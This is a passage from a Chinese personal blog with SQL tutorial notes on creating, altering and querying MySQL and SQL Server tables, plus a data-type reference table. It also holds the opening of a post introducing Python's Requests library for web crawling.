-<h5 id="2-3-3-数据表的增删改查"><a href="#2-3-3-数据表的增删改查" class="headerlink" title="2.3.3  数据表的增删改查"></a>2.3.3  数据表的增删改查</h5><p>插入数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO workers VALUES(1,&apos;张三&apos;,&apos;男&apos;,&apos;1930-11-20&apos;,&apos;123@qq.com&apos;,22);</span><br><span class="line">INSERT INTO workers VALUES(2,&apos;李四&apos;,&apos;男&apos;,&apos;1950-11-20&apos;,&apos;123123@qq.com&apos;,30);</span><br><span class="line">INSERT INTO workers VALUES(3,&apos;王二&apos;,&apos;男&apos;,&apos;1960-10-20&apos;,&apos;123123123@qq.com&apos;,33);</span><br><span class="line">INSERT INTO workers VALUES(4,&apos;张花&apos;,&apos;女&apos;,&apos;1970-11-21&apos;,&apos;223@qq.com&apos;,23);</span><br><span class="line">INSERT INTO workers VALUES(5,&apos;如花&apos;,&apos;女&apos;,&apos;1980-9-21&apos;,&apos;223223@qq.com&apos;,33);</span><br></pre></td></tr></table></figure>
-
-<p>查看表单所有数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM workers;[查看workers表单中所有数据]</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996530430.png" alt="1564996530430"></p>
-<p>查看表单中的id、username、email、age数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,username,email,age FROM workers;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996653470.png" alt="1564996653470"></p>
-<p>将如花的性别改为男：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET gender = &apos;男&apos; WHERE id = 5;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996905642.png" alt="1564996905642"></p>
-<p>删除张花的年龄为23那一行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM workers WHERE age = 23;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997100557.png" alt="1564997100557"></p>
-<p>将张三的年龄也设置为33：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET age = 33 WHERE id = 1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997264053.png" alt="1564997264053"></p>
-<p>将李四改为李四（如花的亲戚），性别女，email为<a href="mailto:88888@qq.com" target="_blank" rel="noopener">88888@qq.com</a>:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE workers SET username = &apos;李四（如花的亲戚）&apos;, gender = &apos;女&apos;,email = &apos;88888@qq.com&apos; WHERE id = 2;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564997607678.png" alt="1564997607678"></p>
-<h2 id="3-SQL-server数据库学习"><a href="#3-SQL-server数据库学习" class="headerlink" title="3. SQL server数据库学习"></a>3. SQL server数据库学习</h2><h3 id="数据库的简单操作"><a href="#数据库的简单操作" class="headerlink" title="数据库的简单操作"></a>数据库的简单操作</h3><h4 id="3-1-创建数据库"><a href="#3-1-创建数据库" class="headerlink" title="3.1 创建数据库"></a>3.1 创建数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> yuangong</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565073269066.png" alt="1565073269066"></p>
-<h4 id="3-2-创建表"><a href="#3-2-创建表" class="headerlink" title="3.2 创建表"></a>3.2 创建表</h4><h5 id="3-2-1-创建员工表"><a href="#3-2-1-创建员工表" class="headerlink" title="3.2.1 创建员工表"></a>3.2.1 创建员工表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> yuangong1(</span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">int</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="literal">NULL</span>,</span><br><span class="line">gender <span class="built_in">VARCHAR</span>(<span class="number">2</span>) <span class="literal">NULL</span>,</span><br><span class="line">birthday <span class="built_in">DATE</span>,</span><br><span class="line">email <span class="built_in">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line">remark <span class="built_in">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565074819173.png" alt="1565074819173"></p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565075261770.png" alt="1565075261770"></p>
-<h5 id="2-3-2-进行表的修改-1"><a href="#2-3-2-进行表的修改-1" class="headerlink" title="2.3.2 进行表的修改"></a>2.3.2 进行表的修改</h5><p>增加年龄列，将email列长度变为30，删除remark列，将name修改为username;</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1 <span class="keyword">ADD</span>  age <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>; [增加年龄列]</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1  <span class="keyword">alter</span> <span class="keyword">column</span> email <span class="built_in">VARCHAR</span>(<span class="number">30</span>); [修改email长度为30]</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> yuangong1 <span class="keyword">DROP</span> <span class="keyword">column</span> remark; [删除remark列]</span><br><span class="line"><span class="keyword">execute</span> sp_rename <span class="string">'yuangong1.name'</span>, <span class="string">'username'</span>; [修改name为username]</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565076410848.png" alt="1565076410848"></p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565076438651.png" alt="1565076438651"></p>
-<h5 id="3-3-3-数据表的增删改查"><a href="#3-3-3-数据表的增删改查" class="headerlink" title="3.3.3 数据表的增删改查"></a>3.3.3 数据表的增删改查</h5><p>插入数据：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'张三'</span>,<span class="string">'男'</span>,<span class="string">'1930-11-20'</span>,<span class="string">'123@qq.com'</span>,<span class="number">22</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">'李四'</span>,<span class="string">'男'</span>,<span class="string">'1950-11-20'</span>,<span class="string">'123123@qq.com'</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">'王二'</span>,<span class="string">'男'</span>,<span class="string">'1960-10-20'</span>,<span class="string">'123123123@qq.com'</span>,<span class="number">33</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">'张花'</span>,<span class="string">'女'</span>,<span class="string">'1970-11-21'</span>,<span class="string">'223@qq.com'</span>,<span class="number">23</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> workers <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">'如花'</span>,<span class="string">'女'</span>,<span class="string">'1980-9-21'</span>,<span class="string">'223223@qq.com'</span>,<span class="number">33</span>);</span><br></pre></td></tr></table></figure>
-
-<p>查看表单所有数据：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">20</span>  *  <span class="keyword">from</span>  yuangong1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077158214.png" alt="1565077158214"></p>
-<p>查看表单中的id、username、email、age数据：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">20</span> <span class="keyword">ID</span>,username,email,age <span class="keyword">FROM</span> yuangong1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077300862.png" alt="1565077300862"></p>
-<p>将如花的性别改为男：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> gender = <span class="string">'男'</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077461115.png" alt="1565077461115"></p>
-<p>删除张花的年龄为23那一行：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> yuangong1 <span class="keyword">WHERE</span> age = <span class="number">23</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077543060.png" alt="1565077543060"></p>
-<p>将张三的年龄也设置为33：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> age = <span class="number">33</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077631256.png" alt="1565077631256"></p>
-<p>将李四改为李四（如花的亲戚），性别女，email为<a href="mailto:88888@qq.com" target="_blank" rel="noopener">88888@qq.com</a>:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> yuangong1 <span class="keyword">SET</span> username = <span class="string">'李四（如花的亲戚）'</span>, gender = <span class="string">'女'</span>,email = <span class="string">'88888@qq.com'</span> <span class="keyword">WHERE</span> <span class="keyword">ID</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565077719594.png" alt="1565077719594"></p>
-<h2 id="4-问题点："><a href="#4-问题点：" class="headerlink" title="4. 问题点："></a>4. 问题点：</h2><h5 id="4-1-mysql在插入数据时，报错："><a href="#4-1-mysql在插入数据时，报错：" class="headerlink" title="4.1 mysql在插入数据时，报错："></a>4.1 mysql在插入数据时，报错：</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564995872259.png" alt="1564995872259"></p>
-<p>网上查询为编码问题，进行表编码转换：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE `workers` DEFAULT CHARACTER SET utf8;[将表workers编码转换为utf8]</span><br><span class="line">ALTER TABLE `workers` CHANGE `username` `username` VARCHAR(20) CHARACTER SET utf8 NOT NULL;[将表中username字段编码转换为utf8]</span><br><span class="line">ALTER TABLE `workers` CHANGE `gender` `gender` VARCHAR(2) CHARACTER SET utf8 NOT NULL;[将表gender字段编码转换为utf8]</span><br></pre></td></tr></table></figure>
-
-<p>插入成功，未报错：</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1564996201637.png" alt="1564996201637"></p>
-<h5 id="4-2-字符类型总结"><a href="#4-2-字符类型总结" class="headerlink" title="4.2 字符类型总结"></a>4.2 字符类型总结</h5><table>
-<thead>
-<tr>
-<th>数据类型</th>
-<th>类型</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>bit</td>
-<td>整型</td>
-<td>bit 数据类型是整型，其值只能是0、1或空值。这种数据类型用于存储只有两种可能值的数据，如Yes 或No、True 或Fa lse 、On 或Off</td>
-</tr>
-<tr>
-<td>int</td>
-<td>整型</td>
-<td>int 数据类型可以存储从- 2^31(-2147483648)到2^31 (2147483 647)之间的整数。存储到数据库的几乎所有数值型的数据都可以用这种数据类型。这种数据类型在数据库里占用4个字节</td>
-</tr>
-<tr>
-<td>smallint</td>
-<td>整型</td>
-<td>smallint 数据类型可以存储从- 2^15(-32768)到2^15(32767)之间的整数。这种数据类型对存储一些常限定在特定范围内的数值型数据非常有用。这种数据类型在数据库里占用2 字节空间</td>
-</tr>
-<tr>
-<td>tinyint</td>
-<td>整型</td>
-<td>tinyint 数据类型能存储从0到255 之间的整数。它在你只打算存储有限数目的数值时很有用。 这种数据类型在数据库中占用1 个字节</td>
-</tr>
-<tr>
-<td>numeric</td>
-<td>精确数值型</td>
-<td>numeric数据类型与decimal 型相同</td>
-</tr>
-<tr>
-<td>decimal</td>
-<td>精确数值型</td>
-<td>decimal 数据类型能用来存储从-10^38-1到10^38-1的固定精度和范围的数值型数据。使用这种数据类型时，必须指定范围和精度。 范围是小数点左右所能存储的数字的总位数。精度是小数点右边存储的数字的位数</td>
-</tr>
-<tr>
-<td>money</td>
-<td>货币型</td>
-<td>money 数据类型用来表示钱和货币值。这种数据类型能存储从-9220亿到9220 亿之间的数据，精确到货币单位的万分之一</td>
-</tr>
-<tr>
-<td>smallmoney</td>
-<td>货币型</td>
-<td>smallmoney 数据类型用来表示钱和货币值。这种数据类型能存储从-214748.3648 到214748.3647 之间的数据，精确到货币单位的万分之一</td>
-</tr>
-<tr>
-<td>float</td>
-<td>近似数值型</td>
-<td>float 数据类型是一种近似数值类型，供浮点数使用。说浮点数是近似的，是因为在其范围内不是所有的数都能精确表示。浮点数可以是从-1.79E+308到1.79E+308 之间的任意数</td>
-</tr>
-<tr>
-<td>real</td>
-<td>近似数值型</td>
-<td>real 数据类型像浮点数一样，是近似数值类型。它可以表示数值在-3.40E+38到3.40E+38之间的浮点数</td>
-</tr>
-<tr>
-<td>datetime</td>
-<td>日期时间型</td>
-<td>datetime数据类型用来表示日期和时间。这种数据类型存储从1753年1月1日到9999年12月3 1日间所有的日期和时间数据， 精确到三百分之一秒或3.33毫秒</td>
-</tr>
-<tr>
-<td>Smalldatetime</td>
-<td>日期时间型</td>
-<td>smalldatetime 数据类型用来表示从1900年1月1日到2079年6月6日间的日期和时间，精确到一分钟</td>
-</tr>
-<tr>
-<td>cursor</td>
-<td>特殊数据型</td>
-<td>cursor 数据类型是一种特殊的数据类型，它包含一个对游标的引用。这种数据类型用在存储过程中，而且创建表时不能用</td>
-</tr>
-<tr>
-<td>timestamp</td>
-<td>特殊数据型</td>
-<td>timestamp 数据类型是一种特殊的数据类型，用来创建一个数据库范围内的唯一数码。 一个表中只能有一个timestamp列。每次插入或修改一行时，timestamp列的值都会改变。尽管它的名字中有“time”， 但timestamp列不是人们可识别的日期。在一个数据库里，timestamp值是唯一的</td>
-</tr>
-<tr>
-<td>Uniqueidentifier</td>
-<td>特殊数据型</td>
-<td>Uniqueidentifier数据类型用来存储一个全局唯一标识符，即GUID。GUID确实是全局唯一的。这个数几乎没有机会在另一个系统中被重建。可以使用NEWID 函数或转换一个字符串为唯一标识符来初始化具有唯一标识符的列</td>
-</tr>
-<tr>
-<td>char</td>
-<td>字符型</td>
-<td>char数据类型用来存储指定长度的定长非统一编码型的数据。当定义一列为此类型时，你必须指定列长。当你总能知道要存储的数据的长度时，此数据类型很有用。例如，当你按邮政编码加4个字符格式来存储数据时，你知道总要用到10个字符。此数据类型的列宽最大为8000 个字符</td>
-</tr>
-<tr>
-<td>varchar</td>
-<td>字符型</td>
-<td>varchar数据类型，同char类型一样，用来存储非统一编码型字符数据。与char 型不一样，此数据类型为变长。当定义一列为该数据类型时，你要指定该列的最大长度。 它与char数据类型最大的区别是，存储的长度不是列长，而是数据的长度</td>
-</tr>
-<tr>
-<td>text</td>
-<td>字符型</td>
-<td>text 数据类型用来存储大量的非统一编码型字符数据。这种数据类型最多可以有2^31-1或20亿个字符</td>
-</tr>
-<tr>
-<td>nchar</td>
-<td>统一编码字符型</td>
-<td>nchar 数据类型用来存储定长统一编码字符型数据。统一编码用双字节结构来存储每个字符，而不是用单字节(普通文本中的情况)。它允许大量的扩展字符。此数据类型能存储4000种字符，使用的字节空间上增加了一倍</td>
-</tr>
-<tr>
-<td>nvarchar</td>
-<td>统一编码字符型</td>
-<td>nvarchar 数据类型用作变长的统一编码字符型数据。此数据类型能存储4000种字符，使用的字节空间增加了一倍</td>
-</tr>
-<tr>
-<td>ntext</td>
-<td>统一编码字符型</td>
-<td>ntext 数据类型用来存储大量的统一编码字符型数据。这种数据类型能存储2^30 -1或将近10亿个字符，且使用的字节空间增加了一倍</td>
-</tr>
-<tr>
-<td>binary</td>
-<td>二进制数据类型</td>
-<td>binary数据类型用来存储可达8000 字节长的定长的二进制数据。当输入表的内容接近相同的长度时，你应该使用这种数据类型</td>
-</tr>
-<tr>
-<td>varbinary</td>
-<td>二进制数据类型</td>
-<td>varbinary 数据类型用来存储可达8000 字节长的变长的二进制数据。当输入表的内容大小可变时，你应该使用这种数据类型</td>
-</tr>
-<tr>
-<td>image</td>
-<td>二进制数据类型</td>
-<td>image 数据类型用来存储变长的二进制数据，最大可达2^31-1或大约20亿字节</td>
-</tr>
-</tbody></table>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-
-    
-
-    
-
-    
-
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/01/python3网络爬虫与信息提取/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Darren-zl">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Darren-学无止境">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/01/python3网络爬虫与信息提取/" itemprop="url">python3网络爬虫与信息提取</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-01T16:55:34+08:00">
-                2019-07-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2019/07/01/python3网络爬虫与信息提取/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://yoursite.com/2019/07/01/python3网络爬虫与信息提取/" class="cy_cmt_count" data-xid="2019/07/01/python3网络爬虫与信息提取/" itemprop="commentsCount"></span>
-                </a>
-              
-            
-          
-
-          
-          
-             <span id="/2019/07/01/python3网络爬虫与信息提取/" class="leancloud_visitors" data-flag-title="python3网络爬虫与信息提取">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Visitors&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </span></div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-
-      
-      
-
-      
-        
-          
-            <h1 id="python3网络爬虫与信息提取"><a href="#python3网络爬虫与信息提取" class="headerlink" title="python3网络爬虫与信息提取"></a>python3网络爬虫与信息提取</h1><h3 id="1-体系结构"><a href="#1-体系结构" class="headerlink" title="1.体系结构"></a>1.体系结构</h3><h6 id="1-1-Requests框架：自动抓取HTML页面与自动网络请求提交"><a href="#1-1-Requests框架：自动抓取HTML页面与自动网络请求提交" class="headerlink" title="1.1 Requests框架：自动抓取HTML页面与自动网络请求提交"></a>1.1 Requests框架：自动抓取HTML页面与自动网络请求提交</h6><h6 id="1-2-robots-txt-网络爬虫排除标准（从该文件中也可知道存在什么目录）"><a href="#1-2-robots-txt-网络爬虫排除标准（从该文件中也可知道存在什么目录）" class="headerlink" title="1.2 robots.txt:网络爬虫排除标准（从该文件中也可知道存在什么目录）"></a>1.2 robots.txt:网络爬虫排除标准（从该文件中也可知道存在什么目录）</h6><h6 id="1-3-BeautifulSoup框架：解析HTML页面"><a href="#1-3-BeautifulSoup框架：解析HTML页面" class="headerlink" title="1.3 BeautifulSoup框架：解析HTML页面"></a>1.3 BeautifulSoup框架：解析HTML页面</h6><h6 id="1-4-RE框架：正则框架，提取页面关键信息"><a href="#1-4-RE框架：正则框架，提取页面关键信息" class="headerlink" title="1.4 RE框架：正则框架，提取页面关键信息"></a>1.4 RE框架：正则框架，提取页面关键信息</h6><h6 id="1-5-Scrapy框架：网络爬虫原理介绍，专业爬虫框架"><a href="#1-5-Scrapy框架：网络爬虫原理介绍，专业爬虫框架" class="headerlink" title="1.5 Scrapy框架：网络爬虫原理介绍，专业爬虫框架"></a>1.5 Scrapy框架：网络爬虫原理介绍，专业爬虫框架</h6><h3 id="2-Requests库"><a href="#2-Requests库" class="headerlink" title="2.Requests库"></a>2.Requests库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span>	requests</span><br><span class="line">r = requests.get(<span class="string">"http://www.baidu.com"</span>) <span class="comment">#抓取页面</span></span><br><span class="line">status = r.status_code <span class="comment">#查看状态码</span></span><br><span class="line">print(<span class="string">"状态码为%s"</span>%status)</span><br><span class="line">r.encoding = <span class="string">'utf-8'</span> <span class="comment">#进行utf-8转码</span></span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>
-
-<p>Requests库的7种主要方法</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>requests.request()</td>
-<td>构造一个请求，支撑以下各个方法的基础方法</td>
-</tr>
-<tr>
-<td>requests.get()</td>
-<td>获取HTML网页的主要方法，对应于HTTP的GET</td>
-</tr>
-<tr>
-<td>r = requests.get(‘url’,timeout=1)</td>
-<td>设置秒数超时，仅对于连接有效</td>
-</tr>
-<tr>
-<td>requests.head()</td>
-<td>获取HTML网页头信息的方法，对应HTTP的HEAR</td>
-</tr>
-<tr>
-<td>requests.post()</td>
-<td>向HTML网页提交POST请求的方法，对应HTTP的POST</td>
-</tr>
-<tr>
-<td>requests.put()</td>
-<td>向HTML网页提交PUT请求的方法，对应HTTP的PUT</td>
-</tr>
-<tr>
-<td>requests.patch()</td>
-<td>向HTML网页提交局部修改请求，对应HTTP的PATCH</td>
-</tr>
-<tr>
-<td>requests.delete()</td>
-<td>向HTML网页提交删除请求,对应HTTP的DELETE</td>
-</tr>
-</tbody></table>
-<ul>
-<li><h5 id="Requests-get方法："><a href="#Requests-get方法：" class="headerlink" title="Requests.get方法："></a>Requests.get方法：</h5></li>
-</ul>
-<h6 id="r-requests-get-url-："><a href="#r-requests-get-url-：" class="headerlink" title="r=requests.get(url)："></a>r=requests.get(url)：</h6><p>get()方法构造一个向服务器请求资源的request对象，返回一个包含服务器资源的Response对象。</p>
-<h6 id="requests-get-url-params-None-kwargs-："><a href="#requests-get-url-params-None-kwargs-：" class="headerlink" title="requests.get(url,params=None,**kwargs)："></a>requests.get(url,params=None,**kwargs)：</h6><p>url:拟获要抓取的url链接</p>
-<p>params:url额外参数，字典或字节流格式，可选</p>
-<p>**kwargs:12个访问控制参数</p>
-<ul>
-<li><h5 id="Requests库的两个重要对象"><a href="#Requests库的两个重要对象" class="headerlink" title="Requests库的两个重要对象"></a>Requests库的两个重要对象</h5></li>
-</ul>
-<p>Response:Response对象包含爬虫返回的内容</p>
-<ul>
-<li><h5 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h5></li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>r.status_code</td>
-<td>HTTP请求返回状态，200表示成功，404表示失败（1XX表示正常处理，2XX表示成功状态，3XX表示需请求进行下一步，4XX表示客户端问题，5XX表示服务端问题）</td>
-</tr>
-<tr>
-<td>r.raise_for_status()</td>
-<td>失败请求非200响应则抛出异常</td>
-</tr>
-<tr>
-<td>r.text</td>
-<td>HTTP响应内容的字符串形式，即url对应的页面内容</td>
-</tr>
-<tr>
-<td>r.headers</td>
-<td>以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None</td>
-</tr>
-<tr>
-<td>r.requests.headers</td>
-<td>返回发送到服务器的头信息</td>
-</tr>
-<tr>
-<td>r.cookies</td>
-<td>返回cookie值</td>
-</tr>
-<tr>
-<td>r.history</td>
-<td>返回重定向信息,当然可以在请求是加上allow_redirects = false 阻止重定向</td>
-</tr>
-<tr>
-<td>r.raw</td>
-<td>返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()</td>
-</tr>
-<tr>
-<td>r.ok</td>
-<td>查看r.ok的布尔值便可以知道是否登陆成功</td>
-</tr>
-<tr>
-<td>r.encoding</td>
-<td>从HTTP header中猜测的相应内容编码方式，进行返回内容的转码（获取当前编码），如r.encoding = ‘utf-8’（设置编码）</td>
-</tr>
-<tr>
-<td>r.apparent_encoding</td>
-<td>从内容中分析出相应的内容编码方式（备选编码方式）</td>
-</tr>
-<tr>
-<td>r.content</td>
-<td>HTTP响应内容的二进制形式</td>
-</tr>
-<tr>
-<td>r.json()</td>
-<td>Requests中内置的JSON解码器，以json形式返回,前提返回的内容确保是json格式的，不然解析出错会抛异常</td>
-</tr>
-<tr>
-<td>r.apparent_encoding</td>
-<td>根据网页内容分析出的编码方式可以 看作是r.encoding的备选。</td>
-</tr>
-</tbody></table>
-<ul>
-<li><h5 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h5></li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>异常</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>requests.ConnectionError</td>
-<td>网络连接错误异常，如DNS查询失败拒绝连接等</td>
-</tr>
-<tr>
-<td>requests.HTTPError</td>
-<td>HTTP错误异常</td>
-</tr>
-<tr>
-<td>requests.URLRequired</td>
-<td>URL缺失异常</td>
-</tr>
-<tr>
-<td>requests.ToolManyRedirects</td>
-<td>超过最大重定向次数，产生重定向异常</td>
-</tr>
-<tr>
-<td>requests.ConnectTimeout</td>
-<td>连接远程服务器超时异常</td>
-</tr>
-<tr>
-<td>requests.Timeout</td>
-<td>请求URL超时，尝试超时异常</td>
-</tr>
-</tbody></table>
-<p>测试代码：</p>
